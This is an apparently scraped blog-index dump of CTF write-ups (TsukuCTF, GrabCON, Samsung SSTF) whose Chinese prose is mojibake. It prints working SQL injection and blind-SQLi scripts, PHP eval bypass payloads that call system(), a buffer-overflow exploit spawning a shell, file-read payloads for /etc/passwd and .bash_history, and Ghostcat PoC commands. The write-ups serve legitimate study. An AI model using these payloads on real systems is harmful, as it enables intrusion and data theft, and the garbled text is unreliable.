æ³•ç”¨è¨€è¯­å®£æ³„çš„äº‹æƒ…è¯‰è¯¸ç¬”å¢¨ä¹Ÿæ˜¯ä¸€ç§ä¸é”™çš„é€‰æ‹©ï¼Œä¸€è¾¹æ‰“å­—ï¼Œä¸€è¾¹ä¸å¾ˆå¤šäº‹å’Œè§£ï¼Œæ…¢æ…¢é‡Šæ€€ã€‚\n","date":"2021-09-21T00:54:07+08:00","permalink":"https://amiaaaz.github.io/life/092121-short-diary/","section":"life","tags":[],"title":"æ— é¢˜"},{"categories":["CTF"],"contents":"è¿™ä¸¤å¤©åˆå¼€å§‹æœ‰ç‚¹æ‘†çƒ‚çš„è¿¹è±¡ï¼Œäºæ˜¯æŠŠå‘¨æœ«çš„ctfçœ‹çœ‹wpï¼Œæ°´ä¸€æ°´ï¼Œå¤ç°ä¸€ä¸‹\nå¦å¤–è¿™ä¸ªctfæœ€ç—›è‹¦çš„åœ°æ–¹åœ¨äºæ˜¯è‹±æ—¥å¤¹æ‚ï¼Œæˆ‘å¼€å§‹æ‡‚æ­ªæœä»åšä¸­æ–‡æ¯”èµ›é¡µé¢çš„æ—¶å€™æœ‰å¤šç—›è‹¦äº†\nWeb/logonly ç»™å‡ºçš„æ˜¯ä¸€ä¸ªæœ‰214155è¡Œçš„æ—¥å¿—æ–‡ä»¶ï¼Œåªæœ‰ç¬¬214154è¡Œè¿”å›200ok\næ˜¾ç„¶æ˜¯è¿›è¡Œäº†ä¸€ä¸ªå­—å…¸æ”»å‡»ï¼Œåœ¨ç¬¬214154æ¬¡å°è¯•æ—¶æ’å¯¹äº†ï¼Œæˆ‘ä»¬ä¸‹è½½ä¸€ä»½kalié‡Œçš„rockyou.txtä¸­çœ‹ä¸€ä¸‹214154æ˜¯ä¸ªå•¥ï¼ˆæœ‰æç¤ºç”¨åˆ°kaliè¿›è¡Œæ”»å‡»ï¼‰\nTsukuCTF{qwertyuiop[]\\\\}\nWeb/digits ä¸€ä¸ªfastapiç«™ï¼Œä½†æ˜¯è¦æ±‚ä¸æ˜¯å¾ˆé«˜çš„æ ·å­\nåŠ å·æ”¾åˆ°urlä¸­ç›¸å½“äºåŠè§’ç©ºæ ¼\nTsukuCTF{you_are_lucky_Tsukushi}\nWeb/login ç™»å½•æ¡†ï¼Œä¸‡èƒ½å¯†ç admin'or 1#\nTsukuCTF{You_4r3_SUP3R_H4CKER}\nä¸€èˆ¬è¿™ç§ç®€å•çš„ç™»å½•éƒ½æ˜¯ä¸‡èƒ½å¯†ç ï¼Œä½†æ˜¯ä¹Ÿå¾—å¤šè¯•ä¸€è¯•ï¼ŒåŠ ä¸ªæ³¨é‡Šç¬¦å•Š åˆ†å·ä»€ä¹ˆçš„\nWeb/login2 è¯´æ˜¯ä»£ç é‡æ„è¿‡äº†\nå†ç”¨ä¸Šé¢çš„ä¸‡èƒ½å¯†ç ç™»å…¥ä¼šæ˜¾ç¤ºè¿™ä¸ªç«™çš„æ‰€æœ‰è´¦å·\nè¯´æ˜è¿˜æ˜¯æœ‰sqliï¼Œå°è¯•ä¸€ä¸‹è”åˆæ³¨å…¥admin'or 1 union select null,null#ï¼Œè·Ÿä¸Šé¢æ˜¯ä¸€æ ·çš„å›æ˜¾ï¼Œè¯´æ˜æœ‰ä¸¤åˆ—ï¼Œç„¶åæ˜¯æ„‰å¿«çš„æ³¨å…¥ï¼ˆæ¯ä¸€æ¬¡çš„å›æ˜¾åœ¨é¡µé¢çš„æœ«å°¾ï¼Œæ³¨æ„è¿™ä¸ªæ˜¯æœ€åˆè¦æ‰¾åˆ°å¹¶ç¡®è®¤çš„ï¼‰\nadmin\u0026#39;or 1 union select table_name,null from information_schema.columns# admin\u0026#39;or 1 union select column_name,null from information_schema.columns where table_name=\u0026#39;super_secret_table\u0026#39;# admin\u0026#39;or 1 union select secret,null from super_secret_table# TsukuCTF{50_muCh_GR3AT_Hacker_!ND3ED}\nWeb/login3 ä¾ç„¶æ˜¯å­˜åœ¨sqliï¼Œç”¨ä¸Šé¢çš„ä¸¤ä¸ªpayloadéƒ½èƒ½å›æ˜¾æ­£å¸¸ï¼Œä½†æ˜¯æ²¡æœ‰æ˜ç¡®çš„ä¿¡æ¯ï¼Œåº”è¯¥æ˜¯éœ€è¦ç›²æ³¨äº†\nimport requests def _execAnyQuery_core(query, pos, mid): url = \u0026#34;\u0026#34; params = { \u0026#34;name\u0026#34;: \u0026#34;\u0026#39;or ascii(substring(({0}),{1},1))\u0026gt;={2};#\u0026#34;.format(query, pos, mid), \u0026#34;password\u0026#34;: \u0026#34;a\u0026#34; } page = requests.post(url, data = params) return \u0026#34;ã‚ˆã†ã“ã\u0026#34; in page.text def _execAnyQuery(query, pos): low = 0 high = 256 while high - low \u0026gt; 1: mid = (high + low) // 2 if _execAnyQuery(query, pos, mid): low = mid else: high = mid return low def execAnyQuery(query): i = 1 while True: char = int(_execAnyQuery(query, i)) if char == 0: return print(chr(char), end=\u0026#34;\u0026#34;) i += 1 execAnyQuery(\u0026#34;select version()\u0026#34;) for i in range(100): execAnyQuery(\u0026#34;select distinct table_name from information_schema.columnns limit 1 offset {0}\u0026#34;.format(i)) print() for i in range(10): execAnyQuery(\u0026#34;select distinct column_name from information_shcema.columns where table_name=\u0026#39;urtla_secret_tsukushi\u0026#39;limit 1 offset {0}\u0026#34;.format(i)) print() for i in range(33): execAnyQuery(\u0026#34;select secret from urtla_secret_tsukushi_limit 1 offset {0}\u0026#34;.format(i)) è¿™æ˜¯å®˜æ–¹wpé‡Œçš„äºŒåˆ†æ³•è„šæœ¬ï¼ŒæŠŠç®€å•çš„äº‹æ‹†æˆäº†3ä¸ªå‡½æ•°ï¼Œå€’æ˜¯ä¹Ÿå¥½ï¼Œå¯å¤ç”¨æ€§max\nTsukuCTF{U_Are_Geni0us_T$UKUSH1}\nWeb/Journey æŠ“åŒ…çœ‹ï¼Œæœ‰å¾ˆå¤š307é‡å®šå‘ï¼Œè¿˜ä»¥ä¸ºæ˜¯è·Ÿä¹‹å‰é‚£ä¸ªä¸€æ ·è¦è·‘ä¸€ä¸‹ä¸€åƒå¤šæ¬¡çš„é‡å®šå‘ï¼Œä½†æ˜¯è¿™ä¸ªé‡å®šå‘æ˜¯æœ‰é™åº¦çš„ï¼Œæœ€åçš„ä½ç½®æ˜¯/problems/journey/goalï¼Œå›æ˜¾405é”™è¯¯\nçœ‹wpï¼Œå­¦åˆ°äº†\ncurl -H \u0026#39;Referer: https://tsukuctf.sechack365.com/problems/journey/railway/1\u0026#39; -X CONNECT https://tsukuctf.sechack365.com/problems/journey/goal åˆ©ç”¨çš„æ˜¯httpè¯·æ±‚ä¸­çš„connectæ–¹æ³•ï¼Œç›¸å…³å†…å®¹å¯å‚è§-\u0026gt;CONNECT(MDN) | HTTPä¹‹connect method\nWeb/gyOTAKU æ»¡è¶³17è¡Œè¦æ±‚çš„è¯ä¼šé€šè¿‡chromium browseræ¥è¿”å›ä¸€ä¸ªæˆªå›¾\næˆ‘ä»¬æ„é€ ä¸€ä¸ªå¦‚ä¸‹çš„htmlé¡µé¢\n\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt; è¿”å›500é”™è¯¯ï¼Œå†è¯•ä¸€ä¸‹\n\u0026lt;script\u0026gt;location.href=\u0026#34;/etc/passwd\u0026#34;\u0026lt;/script\u0026gt; æˆåŠŸè¿”å›\nç”¨ä¸€ä¸‹æˆ‘ä»¬çš„è€æœ‹å‹/root/.bash_history\n\u0026lt;script\u0026gt;location.href=\u0026#34;/root/.bash_history\u0026#34;\u0026lt;/script\u0026gt; å¯ä»¥è¯»ä¸€ä¸‹flagäº†\n\u0026lt;script\u0026gt;location.href=\u0026#34;/root/flagc464f9eba1.txt\u0026#34;\u0026lt;/script\u0026gt; TsukuCTF{Tsukushi_to_Sugina_no_chigai_ga_wakaran}\næ°´ä¸€ç¯‡wpï¼Œæ°´æ°´æ›´å¥åº·\n","date":"2021-09-13T19:15:21+08:00","permalink":"https://amiaaaz.github.io/2021/09/13/tsuku2021-wp/","section":"posts","tags":["wp"],"title":"TsukuCTF2021 Wp"},{"categories":["CTF"],"contents":"Web/E4sy Pe4sy Hack admin user!\nAuthor: r3curs1v3_pr0xy\nä¸‡èƒ½å¯†ç  username=admin\u0026amp;password=%27%3D%27\nGrabCON{E4sy_pe4sy_SQL_1nj3ct10n}\nWeb/Door Lock The door is open to all! See who is behind the admin door??\nAuthor: r3curs1v3_pr0xy\nå’Œä¸Šé¢é‚£ä¸ªä¸€æ ·çš„å‰ç«¯é¡µé¢ï¼Œä½†æ˜¯å¾ˆæ˜¾ç„¶ä¸‡èƒ½å¯†ç å¤±æ•ˆï¼Œéšä¾¿ç™»å…¥ä¸€ä¸ªå·ï¼Œæœ‰æ°´å¹³è¶Šæƒ\nç”¨burpè·‘ä¸€ä¸‹\nGrabCON{E4sy_1D0R_}\nWeb/Null Food Factory Prove your hacking skill to get admin panel.\nAuthor: r3curs1v3_pr0xy\nè¿˜æ˜¯ä¸€æ¨¡ä¸€æ ·çš„å‰ç«¯ï¼Œç›®æ ‡è¿˜æ˜¯ä»¥adminç™»å…¥\nç”¨åˆ°çš„æ˜¯Null byte injectionï¼Œå…ˆä»¥admin%00ä¸ºç”¨æˆ·åæ³¨å†Œ\nç„¶åç”¨Adminçš„åå­—ç™»å…¥\nGrabCON{Null_byt3s_1s_L0v3}\nWeb/Basic Calc Ever used calc based on php?\nAuthor: karma\n\u0026lt;?php if (isset($_POST[\u0026#34;eq\u0026#34;])){ $eq = $_POST[\u0026#34;eq\u0026#34;]; if(preg_match(\u0026#34;/[A-Za-z`]+/\u0026#34;,$eq)){ die(\u0026#34;BAD.\u0026#34;); } echo \u0026#34;Result: \u0026#34;; eval(\u0026#34;echo \u0026#34; . $eq . \u0026#34; ;\u0026#34;); }else{ echo highlight_file(\u0026#39;index.php\u0026#39;,true); } ?\u0026gt; ç°åœ¨çœ‹åˆ°phpçš„é¢˜æ„Ÿè§‰é‚£æ˜¯ç›¸å½“çš„äº²åˆ‡äº†â€¦â€¦\nè™½ç„¶æ˜¯ç›´æ¥æœ‰äº†evalï¼Œä½†æ˜¯è¿™ä¸ªæ­£åˆ™è¿‡æ»¤çš„æœ‰ç‚¹ç‹ ï¼Œå­—æ¯å…¨è¢«banæ‰ å°±åªèƒ½ç”¨xoræˆ–å…«è¿›åˆ¶çš„æ–¹å¼æ¥æŠŠå­—æ¯æå‡ºæ¥\nå…«è¿›åˆ¶ç‰ˆæœ¬ï¼š\n\u0026#34;\\163\\171\\163\\164\\145\\155\u0026#34;(\u0026#34;\\154\\163\u0026#34;) // \u0026#34;system\u0026#34;(\u0026#34;ls\u0026#34;) \u0026#34;\\163\\171\\163\\164\\145\\155\u0026#34;(\u0026#34;\\143\\141\\164\\40\\57\\146\\154\\141\\147\\147\\147\\147\\56\\164\\170\\164\u0026#34;) // \u0026#34;system(\u0026#34;cat /flagggg.txt\u0026#34;)\u0026#34; xor\nOuput: (\u0026#34;system\u0026#34;)(\u0026#34;cat /flagggg.txt\u0026#34;) = ((\u0026#39;3\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;9\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;3\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;4\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;8\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;2\u0026#39;^\u0026#39;_\u0026#39;))((\u0026#39;8\u0026#39;^\u0026#39;[\u0026#39;).(\u0026#39;!\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;4\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;~\u0026#39;).\u0026#39;/\u0026#39;.(\u0026#39;8\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;1\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;!\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;8\u0026#39;^\u0026#39;_\u0026#39;).(\u0026#39;8\u0026#39;^\u0026#39;_\u0026#39;).(\u0026#39;8\u0026#39;^\u0026#39;_\u0026#39;).(\u0026#39;8\u0026#39;^\u0026#39;_\u0026#39;).\u0026#39;.\u0026#39;.(\u0026#39;4\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;8\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;4\u0026#39;^\u0026#39;@\u0026#39;)) GrabCON{b4by_php_f0r_y0u}\nå‚è€ƒï¼š https://mystiz.hk/posts/2021-08-10-uiuctf-phpfuck/ | https://ctf.0xff.re/2021/uiuctf_2021/phpfuck | https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md | https://discord.com/channels/740598439796015204/884036729902866463/884147222982324264\nOSINT/ProtonDate Can you find the date, when was this email created?\nsc4ry_gh0st@protonmail[dot]com\nGrabCON{dd_mm_yyyy}\nAuthor: CETACEAN\nè¯´å®è¯ æ˜¯çº¯çŒœçš„\nGrabCON{03_09_2021}\nä½†æ˜¯çœ‹äº†wpä¹‹åå‘ç°è¿™ç¡®å®æœ‰æ­£è§„çš„åšæ³•ï¼Œä¸€ä¸ªå¼€æºå·¥å…·å«ProtOSINTï¼Œæ‰€ä½¿ç”¨çš„apiå¦‚ä¸‹\nhttps://api.protonmail.ch/pks/lookup?op=index\u0026amp;search=sc4ry_gh0st@protonmail.com æ‹¿åˆ°æ—¶é—´æˆ³1630658267ï¼Œå³Fri 3 September 2021 08:37:47 UTC\nOSINT/Victim 1 We got to know our victims is hiding somewhere. We got access to live CCTV camera of that place. Can you find zip code of that location?\nLive Camera\nGrabCON{zipcode}\nAuthor: CETACEAN\nç»™äº†ä¸€ä¸ªæ‘„åƒå¤´çš„åœ°å€ï¼Œç”¨IP geolocation lookupæŸ¥ä¸€ä¸‹åœ°ç‚¹\nç”»é¢å³ä¸Šæœ‰ä¸ªåœ¨åŠ¨çš„ç¼†è½¦\nzipcode: 39031\nGrabCON{39031}\nOSINT/Website My friend is having a website named, \u0026ldquo;Great Animals Here\u0026rdquo;. He have leaked the flag on his website. Can you find the flag?\nHint: He used free website builder tool to create his site. greatanimalshere\nAuthor: CETACEAN\nhttps://greatanimalshere.weebly.com/\nOSINT/The Tour(1) w0nd3r50uL! I know her but she did something horrible! She recently switched to some free and open-source software for running self-hosted social networking services. Check out her profile and find the last location she visited when she felt hungry?\nAuthor : rey\nç©ºçš„ï¼Œè¯•ä¸€ä¸‹wayback machine\nhttps://web.archive.org/web/20210904191920/https://www.reddit.com/user/w0nd3r50uL/ ä¹Ÿæ˜¯ç©ºçš„ï¼Œç”¨sherlockæŸ¥ä¸€ä¸‹\nåé¢çš„å†…å®¹å¯ä»¥è¯¦è§wpäº†ï¼Œå¾ˆå°‘åšOSINTï¼Œä½†æ˜¯æ„Ÿè§‰å¥½æœ‰æ„æ€ï¼Œå°±æ˜¯æ‰¾çš„å¥½éº»çƒ¦ï¼Œè„‘æ´å¥½å¤§ï¼Œä¸å®¹æ˜“å•Š\nOSINT/The Tour(2) Can you find the flight number and the flight operator of the last flight that took her to the final destination? E.g. GrabCON{AF226_Air_France}\nAuthor : rey\nwp-\u0026gt;https://kashmir54.github.io/ctfs/GrabCON/#the-tour2\nMisc/Welcome GrabCON{welcome_to_grabcon_2021}\nGrabCON{welcome_to_grabcon_2021}\nMisc/Discord Join our discord server!\næ†¨æ‰¹æœºå™¨äººï¼Œæˆ‘æ²¡ææ˜ç™½è¿™ä¸ªæ˜¯æ€ä¹ˆç©çš„\ntmd è¯•äº†å¥½ä¹… ç»“æœç«Ÿç„¶åœ¨#role\nGrabCON{s@n1ty_fl4g_1s_here}\nfxxxk\nMisc/YouTube Find us on YouTube.\nGrabCON{th3_qu1ck_br0wn_f0x_jumps_0v3r_th3_lazy_d0g}\nMisc/Find me Checkout author\u0026rsquo;s social media.\nAuthor: Offen5ive\nGrabCON{n0_fl4g_h3r3}\nCrypto/Warm-up Mukesh used to drink and then smoke 5 times a day. He is now suffering form cancer his drink was 64 rupees and 32 rupees cigarette that costs to cheap for him. And he has this much of cancer now.\nAuthor: Offen5ive\nfile:///D:/CyberChef_v9.30.0/CyberChef_v9.30.0.html#recipe=From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base32(\u0026#39;A-Z2-7%3D\u0026#39;,false)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base32(\u0026#39;A-Z2-7%3D\u0026#39;,false)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base32(\u0026#39;A-Z2-7%3D\u0026#39;,false)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base32(\u0026#39;A-Z2-7%3D\u0026#39;,false)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base32(\u0026#39;A-Z2-7%3D\u0026#39;,false)\u0026amp;input=UzAxWlJFTlhVMU5KVmtoR1VWWktVa3BhUmtaTk1sTkxTVFZLVkVOV1UweExWbFpZUVZsTFZFbGFUa1ZWVmxSTlMwcElSa2MyVTFkS1ZrcEhWMDFMV0V0YVExVlZWRU5YVGxKT1JsTlZTMWRPVWtkR1MwMUVWVXMxUzBkWFZsTkxTMXBEV0ZGVVExUk9VbGxGVDFWVVRFMVNURlpEVFV4RlNrNU1SMWMwUTBsTFdWbEVRMVJEV0V0V01rWk5WakpXVGtKS1JrMVNTMDlNUWt0SFYwNUVXa3RLVjBVMFZsTk9UbEpUUlZkV1ZFdExTa3hXUjAxQ1VrbE9URWRYTlVOUVMwNVhSa1ZTUTFkTFdraEZTVlZhVWs5Q1RVWkZNakpYUzFaS1ZFTlhVMHRMV2xaV1ZWSlRWVWRHVEVaTFZrTkdSMFpJVlRSU1UxWlFSa2RYV1ZSVFRVdE9WbFJMVkV0VFIwWlNWRUZWU2xGTlVrZEdTVlpVVFVzMVNrWk5WRXhhUzFwV1dFbFdNazVPVGt4Rk5GWlVTMHBLVEZaSlVreFJTbFpLUjFkTlMxUkxUVmxFVTFSRFZrNU9Na1ZSVmpKWFNscExSazFXVEZWS1RrcFVRMVZUUlV0YVYwVTBWakpUUjBKT1JrbFZVMWROVWt4R1RWSk1WVXBTU2xkWE5rTllTMGxaVmxWU1ExUkhRVmxWVDFaRFJrMVNUVVUwVmt0UFMwWktWRU5UVTBWTFdsZEdUVlpMVWtkR1UwVTJWa3hNVFZKTlZrdE5TMWROUmt0WFYwOUxSRXRGV1VaVlZVTldUazR5UlZGVldsSlBRa2RHVFZKTFQwczFTMVJCTTBOTlMwcFdXRkZUUTFoTFdsTkZTVlpNVEUxU1JGWkpNakl5U2xKTVIxZFVVMGhMU1ZsV1ZWTXlWMDVPVTBaSFZUTXlTa3BHUmtzeU0wVkxWa2xXVFZWVFZVdFNTMWhKVkRKWFIwSk9SazFXVERKS1NrMUdSVTFETWt0T1RFVkxVbE5YUzA1WFJVMVZRMUpPVGxORlQxWkVNa3BHTlVaUFZreE1SMFpLVkVGWFUwOUxXVmxWTkZKVFZFZEdXVVZKVmxKUlRsSktSVEl5V2xaS05VdEhWMDVMUjB0V1RFWlZWa05YVGswMFZVZFZNMHhNU2taR1N6SXpXVXRLU2xkWFUxTk1TMGxaVjBkTlMxSkhSa3BGV1ZaTVRFcGFUVlpMVmxOUFNsSkxWRUUxUTFOTE5VdFdSVlpEVjB0V1NFWk5WVkpSU1ZWWlJrMHlNa2RMV2twWFZWWlRTa3RhUzBSQlQwdFJTMUZaUkZOVlExSklWVFpSUFQwOVBRPT0K å…¨éƒ¨æ˜¯b64åŠ å¯† å¾ˆç®€å•äº†\nGrabCON{dayuum_s0n!}\nå¥½èœå¥½èœï¼Œå¼€å­¦äº† å¥¥é‡Œç»™\n","date":"2021-09-07T11:22:14+08:00","permalink":"https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/","section":"posts","tags":["wp"],"title":"GrabCONCTF2021 Wp"},{"categories":["CTF"],"contents":"https://research.samsung.com/sstf\nhttps://playground.sstf.site/challenges\nTutorial/Practice: Flag Submission SCTF{It_15_tim3_t0_hack!!}\nTutorial/BOF 101 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212261\u0026amp;authkey=%21AO4uYzudT40Rn_Y\u0026amp;em=2\nSCTF{n0w_U_R_B0F_3xpEr7}\nTutorial/BOF 102 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212251\u0026amp;authkey=%21AMhDJ94NiXLWqYs\u0026amp;em=2\nfrom telnetlib import Telnet tn = Telnet(\u0026#34;bof102.sstf.site\u0026#34;, 1337) tn.read_until(b\u0026#34;Name \u0026gt; \u0026#34;) tn.write(b\u0026#34;/bin/sh\u0026#34; + b\u0026#34;\\n\u0026#34;) payload = b\u0026#39;A\u0026#39;*20 payload += b\u0026#39;\\xe0\\x83\\x04\\x08\u0026#39; payload += b\u0026#39;C\u0026#39;*4 payload += b\u0026#39;\\x34\\xa0\\x04\\x08\u0026#39; tn.read_until(b\u0026#34; \u0026gt; \u0026#34;) tn.write(payload + b\u0026#39;\\n\u0026#39;) tn.interact() SCTF{B0F_A774ck_w1Th_arg5_1n_x86}\nTutorial/SQLi 101 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212257\u0026amp;authkey=%21ALtIE_cNe-XDn2o\u0026amp;em=2\nSCTF{th3_f1rs7_5t3p_t0_the_w3B_h4ckEr}\nTutorial/SQLi102 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212260\u0026amp;authkey=%21AGPulJniPCbx8v4\u0026amp;em=2\n\u0026lt;?php include \u0026#34;./config.php\u0026#34;; $succ = -1; if($_GET[\u0026#39;showsrc\u0026#39;]) { show_source(\u0026#34;step1.php\u0026#34;); die; } if($_GET[\u0026#39;searchkey\u0026#39;]) { $succ = 0; $query = \u0026#34;select * from books where title like \u0026#39;%\u0026#34;.$_GET[\u0026#39;searchkey\u0026#39;].\u0026#34;%\u0026#39;\u0026#34;; $db = dbconnect(\u0026#34;sqli102_step3\u0026#34;); $result = mysqli_query($db,$query); mysqli_close($db); if($result) { $rows = mysqli_num_rows($result); } } ?\u0026gt; SCTF{b451c_SQLi_5k1lls}\nTutorial/RC four https://www.geeksforgeeks.org/rc4-encryption-algorithm/\nhttps://onedrive.live.com/embed?resid=F7E83213DDD289C7%212253\u0026amp;authkey=%21AOekQp-wZMxDdfA\u0026amp;em=2\nTutorial/RSA 101 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212256\u0026amp;authkey=%21ANLCkvPBdXSb8Ko\u0026amp;em=2\nWeb/SW Expert Academy Are you poor at algorithm coding? Here is amazing platform to enhance your coding skill!\nå¥½å®¶ä¼™ï¼Œæ¢¦å›å­¦cè¯­è¨€çš„æ—¶å€™ï¼Œçœ‹åˆ°è¿™ä¸ªéª°å­çš„æ¦‚ç‡åˆèƒ½æ¢¦å›é«˜ä¸‰æ•°å­¦çš„æ¦‚ç‡éƒ¨åˆ†\nä½†æ˜¯æï¼Œå®ƒå¹¶ä¸éœ€è¦ä½ å…·ä½“å†™å‡ºæ¥codeï¼Œæ ‡ç­”å·²ç»ç»™å‡ºï¼ˆè™½ç„¶æˆ‘æ†¨æ†¨çš„ä¸€å¼€å§‹æ²¡å‘ç°è‡ªå·±è¿˜å†™äº†ä¸€ä»½ï¼‰\nint a[12];for(int i=0;i\u0026lt;12;i++)scanf(\u0026#34;%d\u0026#34;,a+i);int ans=0;int mod=36;for(int i=0;i\u0026lt;6;i++)for(int j=6;j\u0026lt;12;j++)if(a[i]\u0026gt;a[j])ans++;for(int i=2;i\u0026lt;36;i++)while(ans\u0026gt;=i\u0026amp;\u0026amp;ans%i==0\u0026amp;\u0026amp;mod%i==0)ans/=i,mod/=i;printf(\u0026#34;%d/%d\u0026#34;,ans,mod); å½“ç„¶ç›´æ¥è®¿é—®/flag.txtåˆæ˜¯ä¸å¯ä»¥çš„\né—®é¢˜å°±è½¬åŒ–ä¸ºäº†å¦‚ä½•åœ¨è¾“å‡ºä¸ºç¬¦åˆæ ·ä¾‹è¦æ±‚çš„æ ‡å‡†è¾“å‡ºçš„æƒ…å†µä¸‹è¿˜èƒ½æ‰“å°ä¸€ä»½åœ°å€å·²çŸ¥çš„flag.txtå‡ºæ¥\nç”±äºgccæ—¢èƒ½ç¼–è¯‘cä¹Ÿå¯ä»¥ç¼–è¯‘c++ï¼Œè¿™é‡Œç”¨importæ¥ç»•è¿‡å¯¹includeçš„é™åˆ¶ï¼›è€Œå¯¹äº#çš„ç»•è¿‡å¯ä»¥å‚è§-\u0026gt;Digraphs and trigraphs\n??=import \u0026#34;/flag.txt\u0026#34; %:import \u0026#34;/flag.txt\u0026#34; ç›¸å½“äº#import \u0026ldquo;/flag.txt\u0026rdquo;ï¼Œä»gccç¼–è¯‘æ—¶çš„æŠ¥é”™ä¿¡æ¯å¯ä»¥å¾—åˆ°flag\næˆ–è€…ç”¨åæ–œæ +æ¢è¡Œçš„å½¢å¼\n??=incl\\ ude \u0026#34;/flag.txt\u0026#34; ä¹Ÿå¯ä»¥ç»•è¿‡å¯¹includeçš„è¿‡æ»¤\nSCTF{take-care-when-execute-unknown-code}\nâ€”â€”â€”â€”ç±»ä¼¼çš„é¢˜ä¹‹å‰åšè¿‡ä¸€ä¸ª[FireshellCTF2020]Caasï¼Œä¹Ÿæ˜¯é¢„å¤„ç†éå†æŠ¥é”™å‡ºflag\nâ€”â€”â€”â€”åœ¨çœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpä¹‹åçœ‹åˆ°äº†å¦ä¸€ç§è§£æ³•ï¼Œä»æœªè®¾æƒ³è¿‡çš„é“è·¯\nWeb/Poxe Center how to get legendary poxemon?\nçœ‹äº†wpï¼Œç›´æ¥sqlmapä¸€æŠŠæ¢­\nä¸è¿‡å®˜æ–¹çš„é¢„æœŸè§£wpæ›´å¤æ‚ä¸€äº›ï¼š\nå…ˆçˆ†ç›®å½•/docs/\nè¿™ä¸ªç‰ˆæœ¬ä¸‹æœ‰CVE-2020-1938 - Ghostcatï¼Œç›¸å…³æ–‡ç« å‚è€ƒ-\u0026gt;ä¸è°ƒè¯•æºç é‡ç° Ghostcat æ¼æ´ (CVE-2020-1938)\nä½¿ç”¨å…¬å¼€çš„pocè¯»ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼Œä¹‹åå°†classåç¼–è¯‘è·å¾—javaæºæ–‡ä»¶ï¼ˆå®˜æ–¹pocç²¾ç®€äº†ä¸€äº›å†…å®¹ ä¸è¿‡å¤§å·®ä¸å·®ï¼‰\npython poc.py -p 31811 -f \u0026#34;/WEB-INF/web.xml\u0026#34; 127.0.0.1 python poc.py -p 31811 -f \u0026#34;/WEB-INF/classes/com/samsung/sctf/MainController.class\u0026#34; 127.0.0.1 python poc.py -p 31811 -f \u0026#34;/WEB-INF/classes/com/samsung/sctf/gochaMapper.class\u0026#34; 127.0.0.1 python poc.py -p 31811 -f \u0026#34;/WEB-INF/demo/WEB-INF/classes/mapper/gochaMapper.xml\u0026#34; 127.0.0.1 /WEB-INF/classes/mapper/gochaMapper.xmlæ˜¯è¿™æ ·çš„\nè¿™é‡Œçš„sortNameå’ŒsortFlagç›´æ¥æ‹¼æ¥è¿›sqlè¯­å¥ä¸­æ²¡æœ‰è¿‡æ»¤ï¼Œå°è¯•sqli\nsortName=(case%20when%20(select%20true)%20then%20BID%20else%20%270%27%20end)\u0026amp;sortFlag=desc sortName=(case when (select true) then poke_name else \u0026#39;0\u0026#39; end)\u0026amp;sortFlag=asc sortName=(case%20when%20(select%20false)%20then%20BID%20else%20%270%27%20end)\u0026amp;sortFlag=desc sortName=(case when (select false) then poke_name else \u0026#39;0\u0026#39; end)\u0026amp;sortFlag=asc sortName=random())dummy UNION SELECT\u0026#39;A\u0026#39;,\u0026#39;B\u0026#39;,\u0026#39;C\u0026#39;,\u0026#39;D\u0026#39;,\u0026#39;D\u0026#39;,\u0026#39;F\u0026#39;,now(),\u0026#39;G\u0026#39;,\u0026#39;H\u0026#39;,\u0026#39;I\u0026#39; FROM(SELECT 1 sortFlag=NULL sortName=random())dummy UNION SELECT DD.\u0026#34;index\u0026#34;,DD.\u0026#34;name\u0026#34;,DD.first_attribute,DD.second_attribute,\u0026#39;XX\u0026#39;,\u0026#39;XX\u0026#39;,now(),\u0026#39;XX\u0026#39;,\u0026#39;XX\u0026#39;,\u0026#39;XX\u0026#39; FROM( SELECT * from poke_info sortFlag=\u0026#34;\u0026#34; {G0tcH4_Gh0sT_c4t_iS_L3G3ND4Ry_P0k3}\nMisc/meLorean There was a crazy Data Scientist who rectilinearly claimed mathematics can make miracles. He left a note and then disappeared. Help to decode it.\nç»™å‡ºäº†ä¸€ä¸ªè¿™æ ·çš„æ–‡ä»¶ï¼Œå……æ»¡äº†äºŒç»´åæ ‡\nä¸€ä¸ªçº¿æ€§å›å½’çš„ç›¸å…³é—®é¢˜ï¼Œéœ€è¦ç”¨åˆ°pythonä¸­çš„sklearn.linear_modelè¿›è¡Œæ•°æ®å¤„ç†\nimport ast from sklearn.linear_model import LinearRegression r = LinearRegression() flag = [] with open(\u0026#34;dataset.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: for l in f: l = ast.literal_eval(l) X = [[i[0]] for i in l] y = [i[1] for i in l] r.fit(X, y) flag.append(chr(int(round(r.coef_[0])))) print(\u0026#34;\u0026#34;.join(flag)) SCTF{Pr0gre55_In_R3gr3ss}\nADBaby æ˜¯åœ¨çœ‹wpçš„æ—¶å€™æ³¨æ„åˆ°çš„é¢˜ï¼Œçœ‹äº†ä¸ªå¤§æ¦‚æµç¨‹ï¼ˆå…¶å®åªæ˜¯çœ¼ç†Ÿadbè€Œå·² 